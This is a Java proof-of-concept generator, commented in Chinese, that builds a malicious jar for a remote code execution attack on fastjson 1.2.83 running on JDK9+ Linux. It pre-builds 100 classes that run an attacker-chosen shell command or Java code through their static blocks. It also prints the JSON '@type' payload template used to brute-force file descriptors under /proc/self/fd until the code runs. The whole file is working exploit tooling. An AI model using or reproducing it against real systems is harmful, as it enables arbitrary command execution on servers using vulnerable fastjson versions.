package PoC_1283;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * 生成 fastjson 1.2.83 RCE 【二阶段 · jar:file 本地 fd 加载】的恶意 jar。
 *
 * 背景：JDK9+ 一阶段（jar:http://）因 JVM 对连续 // 的类名校验失败，只能 SSRF。
 * 但 JVM 通过 jar:http 下载 jar 后会缓存到 /tmp/jar_cache*.tmp 并删除文件、保留 fd，
 * 于是可用 jar:file:/proc/self/fd/N!/X 读回该 fd 里的 jar 完成类加载（Linux）。
 * 由于 fd 号未知，jar 里预置 fd1~fd100 共 100 个候选类，逐个爆破。
 *
 * static 逻辑有三种输入（三选一，见 --cmd/--code/--code-file）。
 *
 * 使用：
 *   java -cp ... PoC_1283.GenFileProbe \
 *       (--cmd "touch /tmp/pwned" | --code "new File('/tmp/x').createNewFile();" | --code-file payload.java)
 * 爆破 payload（N = fd 号，1..100）：
 *   {"@type":"jar:file:.proc.self.fd.<N>!.E<N>","x":1}
 */
public class GenFileProbe {

    /** 爆破范围 */
    static final int FD_MIN = 1;
    static final int FD_MAX = 100;

    public static void main(String[] args) throws Exception {
        String mode = "cmd";
        String value = "touch /tmp/pwned";
        String outPath = "www/probe_file";

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--cmd": case "--code": case "--code-file":
                    mode = args[i].substring(2);
                    value = args[++i];
                    break;
                default:
                    System.err.println("unknown arg: " + args[i]);
                    System.err.println("usage: GenFileProbe (--cmd C | --code JAVA | --code-file F)");
                    System.exit(1);
            }
        }

        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(outPath))) {
            for (int fd = FD_MIN; fd <= FD_MAX; fd++) {
                String className   = "E" + fd;                          // jar 内 entry 名 / 合法类名
                String internalName = "jar:file:/proc/self/fd/" + fd + "!/E" + fd; // this_class

                byte[] classBytes = JavassistGen.generate(internalName, JavassistGen.resolveBody(mode, value));
                jos.putNextEntry(new JarEntry(className + ".class"));
                jos.write(classBytes);
                jos.closeEntry();
            }
        }

        System.out.println("[+] jar written: " + outPath + " (" + (FD_MAX - FD_MIN + 1) + " candidate classes, fd " + FD_MIN + "~" + FD_MAX + ")");
        System.out.println("[+] body(mode)  : " + mode);
        System.out.println("[+] payload 模板: {\"@type\":\"jar:file:.proc.self.fd.<N>!.E<N>\",\"x\":1}   (N = fd 号)");
        System.out.println("[+] 爆破方式    : 遍历 N = 1..100 发送 payload，命中 fd 即 RCE");
    }
}